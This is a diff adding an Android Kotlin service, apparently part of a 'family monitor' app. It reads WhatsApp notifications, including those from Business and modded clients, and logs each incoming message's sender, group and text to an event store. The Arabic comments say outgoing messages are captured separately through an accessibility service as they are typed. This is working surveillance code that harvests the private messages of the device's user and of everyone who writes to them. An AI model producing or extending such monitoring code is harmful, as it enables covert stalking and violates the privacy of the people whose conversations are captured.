@@ -1,0 +1,156 @@
+package com.family.monitor
+
+import android.app.Notification
+import android.os.Build
+import android.os.Bundle
+import android.service.notification.NotificationListenerService
+import android.service.notification.StatusBarNotification
+import org.json.JSONObject
+
+/**
+ * رصد رسائل واتساب المستلمة عبر الإشعارات — الرسمي + كل النسخ المعدلة.
+ *
+ * ما يُسجَّل (وارد فقط — الصادر من خدمة إمكانية الوصول):
+ *  - الرسائل الواردة من الأشخاص: اسم المرسل + نص الرسالة.
+ *  - الرسائل الواردة في المجموعات: اسم المجموعة + اسم المرسل داخلها + نص الرسالة.
+ *  - من الرسمي (com.whatsapp) ومن WhatsApp Business ومن GB/FM/Yo/Plus وغيرها.
+ *
+ * ما لا يمكن تسجيله من الإشعارات: الرسائل الصادرة (لا تصدر إشعارًا) —
+ * لذلك تُرصد الصادرة من خدمة إمكانية الوصول أثناء الكتابة والإرسال.
+ *
+ * يجب منح صلاحية «الوصول إلى الإشعارات» من إعدادات النظام مرة واحدة.
+ */
+class WhatsappNotificationService : NotificationListenerService() {
+
+    companion object {
+        // عناوين إشعارات واتساب الداخلية التي لا تمثل رسائل
+        private val NOISE_TITLES = listOf(
+            "whatsapp", "واتساب", "إعادة الاتصال", "reconnecting",
+            "جارٍ التحميل", "downloading", "تحديث", "backup", "نسخ احتياطي",
+            "checking for messages", "connectivity", "battery"
+        )
+
+        // منع التكرار: بصمة الإشعار → وقت آخر ظهور
+        private val fingerprints = mutableMapOf<String, Long>()
+        private const val DEDUPE_MS = 10 * 60_000L // واتساب يعيد نشر الإشعار عند فتح القفل — نمنع التكرار 10 دقائق
+    }
+
+    override fun onNotificationPosted(sbn: StatusBarNotification?) {
+        if (sbn == null) return
+        val pkg = sbn.packageName ?: return
+        if (!Config.isWhatsApp(pkg)) return
+
+        val notification = sbn.notification ?: return
+        if (sbn.isOngoing) return  // إشعارات مستمرة (اتصال جارٍ، تحميل...) ليست رسائل
+
+        val extras = notification.extras ?: return
+
+        // ---------- قراءة الرسائل: MessagingStyle أولاً (أدق — تشمل المرسل والمجموعة) ----------
+        val messages = extractMessagingMessages(extras)
+        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim() ?: ""
+        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim() ?: ""
+
+        // منع تكرار نفس الإشعار (واتساب يحدّث الإشعار نفسه عدة مرات)
+        val now = System.currentTimeMillis()
+        fingerprints.entries.removeAll { it.value < now - DEDUPE_MS }
+
+        if (messages.isNotEmpty()) {
+            for (m in messages) {
+                val sender = m.sender?.trim().orEmpty()
+                val body = m.text?.trim().orEmpty()
+                if (body.isEmpty()) continue
+                val group = m.groupName?.trim().orEmpty()
+                record(pkg, contact = group.ifBlank { sender }, sender = sender, text = body, group = group.isNotEmpty())
+            }
+            return
+        }
+
+        // ---------- الطريقة القديمة: EXTRA_TITLE + EXTRA_TEXT ----------
+        if (title.isEmpty()) return
+        if (NOISE_TITLES.any { title.contains(it, ignoreCase = true) }) return
+        if (text.isEmpty() || text == "رسالة جديدة" || text.equals("new message", ignoreCase = true)) {
+            if (title.length < 2) return
+        }
+        val fp = "$pkg|$title|$text"
+        if (fingerprints.containsKey(fp)) return
+        fingerprints[fp] = now
+        record(pkg, contact = title, sender = title, text = text, group = false)
+    }
+
+    private fun record(pkg: String, contact: String, sender: String, text: String, group: Boolean) {
+        if (contact.isBlank()) return
+        val meta = JSONObject().put("text", text.take(500))
+        if (group && sender.isNotBlank() && sender != contact) {
+            meta.put("sender", sender.take(120)).put("group", true)
+        }
+        val json = JSONObject()
+            .put("type", "WHATSAPP")
+            .put("direction", "INCOMING")
+            .put("title", contact.take(120))     // اسم الشخص أو اسم المجموعة
+            .put("app", whatsappLabel(pkg))
+            .put("packageName", pkg)
+            .put("meta", meta)
+        EventStore.addEvent(applicationContext, json)
+    }
+
+    // ---------- استخراج رسائل MessagingStyle ----------
+
+    private data class Msg(val sender: String?, val text: String?, val groupName: String?)
+
+    private fun extractMessagingMessages(extras: Bundle): List<Msg> {
+        val out = mutableListOf<Msg>()
+        try {
+            val arr = if (Build.VERSION.SDK_INT >= 24) {
+                extras.getParcelableArray(Notification.EXTRA_MESSAGES)
+            } else null
+            val displayName = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()
+                ?: extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()
+
+            if (arr != null) {
+                for (item in arr) {
+                    if (item is Notification.MessagingStyle.Message) {
+                        val person = item.senderPerson
+                        out.add(
+                            Msg(
+                                sender = person?.name?.toString(),
+                                text = item.text?.toString(),
+                                groupName = displayName
+                            )
+                        )
+                    }
+                }
+                if (out.isNotEmpty()) return out
+            }
+
+            // احتياط للنسخ المعدلة التي تنسخ البيانات في حقول إضافية
+            val history = extras.getCharSequenceArray(Notification.EXTRA_MESSAGES)?.toList()
+            if (history != null && history.isNotEmpty()) {
+                for (line in history) {
+                    val t = line?.toString() ?: continue
+                    val sep = t.indexOf(':')
+                    if (sep in 1 until t.length) {
+                        out.add(Msg(sender = t.substring(0, sep), text = t.substring(sep + 1).trim(), groupName = displayName))
+                    } else {
+                        out.add(Msg(sender = displayName, text = t, groupName = displayName))
+                    }
+                }
+            }
+        } catch (_: Exception) {
+        }
+        return out
+    }
+
+    private fun whatsappLabel(pkg: String): String = when (pkg.lowercase()) {
+        "com.whatsapp" -> "WhatsApp"
+        "com.whatsapp.w4b" -> "WhatsApp Business"
+        "com.gbwhatsapp", "com.gbwhatsm", "com.gbwhatsw4b" -> "GBWhatsApp"
+        "com.fmwhatsapp" -> "FMWhatsApp"
+        "com.yowhatsapp", "com.yowhatsm" -> "YoWhatsApp"
+        "com.whatsappplus", "com.wplus" -> "WhatsApp Plus"
+        else -> "WhatsApp"
+    }
+
+    override fun onListenerConnected() {
+        // لا نحتاج قراءة الإشعارات القديمة — نرصد الجديد فقط
+    }
+}
